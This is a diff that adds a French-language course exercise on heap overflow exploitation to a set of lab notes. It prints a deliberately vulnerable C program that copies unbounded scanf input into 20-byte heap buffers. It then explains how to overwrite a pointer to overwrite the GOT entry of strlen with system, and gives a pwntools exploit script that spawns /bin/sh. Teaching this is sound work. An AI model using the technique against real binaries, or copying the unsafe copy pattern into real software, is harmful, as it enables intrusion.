@@ -86,3 +86,78 @@ Please input a word: That's correct!
 ### TD2
 #### Binwalk
 ### TD3
+#### Heap overflow
+
+Nous allons exploiter un binaire dont voici le code source:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct user {
+ char * name;
+};
+
+int main(int argc, char **argv){
+
+  struct user *bot;
+  bot = (struct user*)malloc(sizeof(struct user*));
+  bot->name = malloc(sizeof(char)*20);
+  strcpy(bot->name, "botname\0");
+
+  struct user *nick;
+  nick = (struct user*)malloc(sizeof(struct user*));
+  nick->name = malloc(sizeof(char)*20);
+  strcpy(nick->name, "nickname\0");
+
+  char buf[256];
+  int size;
+
+  //printf("0x%08x\n", printf);
+
+  printf("Change botname?\n");
+  memset(buf,0,256); 
+  scanf("%s",buf);
+  size = strlen(buf);
+  strcpy(bot->name, buf);
+
+  printf("Change nickname?\n");
+  memset(buf,0,256); 
+  scanf("%s",buf);
+  strcpy(nick->name, buf);
+
+  printf("Your message?\n");
+  memset(buf,0,256); 
+  scanf("%s",buf);
+  size = strlen(buf);
+  free(bot);
+  //free(nick);
+  printf("Message sent\n");
+  return 0;
+}
+```
+
+Grâce à un heap overflow de la structure 'bot' nous allons pouvoir modifier l'adresse de la structure 'nick'. Ceci va nous donner une écriture arbitraire. Où pourrions nous écrire quelque chose d'interéssant? La Global offset table qui redirige vers les fonctions de la Glibc me parait une bonne cible. On pourrais par exemple remplacer l'adresse de 'strlen' par 'system' et executer '/bin/sh' à la place du message.
+
+exploit:
+
+```
+import sys
+import struct
+from pwn import *
+
+
+pad = "AAAAAAAA"*4
+read_addr = struct.pack("<Q", 0x555555755030) # adresse de strlen dans la GOT
+s1 = pad + read_addr + "\n"
+
+strlen = 0x7ffff7a89190 # adresse de strlen dans la Glibc
+
+
+# step 2 arbitrary writing
+system = struct.pack("<Q", strlen-0xfd10) # adresse de system de la Glibc par offset
+s2 = system + "\n" + "/bin/sh\n"
+
+sys.stdout.write(s1 + s2)
+```
